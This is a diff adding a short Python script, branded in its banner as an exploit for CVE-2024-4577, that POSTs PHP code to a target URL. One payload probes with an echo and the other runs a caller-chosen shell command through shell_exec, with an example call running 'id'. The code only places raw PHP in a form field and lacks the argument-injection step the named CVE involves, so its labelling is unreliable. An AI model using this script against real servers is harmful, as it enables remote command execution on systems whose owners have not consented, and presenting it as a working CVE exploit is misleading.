@@ -1,0 +1,40 @@
+from requests import Request, Session
+
+def title():
+    print(r'''
+    
+   _______      ________    ___   ___ ___  _  _          _  _   _____ ______ ______ 
+  / ____\ \    / /  ____|  |__ \ / _ \__ \| || |        | || | | ____|____  |____  |
+ | |     \ \  / /| |__ ______ ) | | | | ) | || |_ ______| || |_| |__     / /    / / 
+ | |      \ \/ / |  __|______/ /| | | |/ /|__   _|______|__   _|___ \   / /    / /  
+ | |____   \  /  | |____    / /_| |_| / /_   | |           | |  ___) | / /    / /   
+  \_____|   \/   |______|  |____|\___/____|  |_|           |_| |____/ /_/    /_/                                                                                                              
+                                                                                                                      
+                                                                              
+
+Author: Yesith Alvarez
+Github: https://github.com/yealvarez
+Linkedin: https://www.linkedin.com/in/pentester-ethicalhacker/
+Code improvements: https://github.com/yealvarez/CVE/blob/main/CVE-2024-4577/exploit.py
+    ''')
+
+def exploit(url, command):       
+    payloads = [
+        '<?php echo "vulnerable"; ?>',
+        '<?php echo shell_exec("' + command + '"); ?>' 
+    ]    
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    
+    session = Session()
+    for payload in payloads:
+        data = {'payload': payload}
+        req = Request('POST', url, data=data, headers=headers)
+        prepped = req.prepare()
+        response = session.send(prepped)
+        print(response.text)
+
+# Ejemplo de uso
+title()
+exploit('http://example.com/vulnerable_endpoint', 'id')
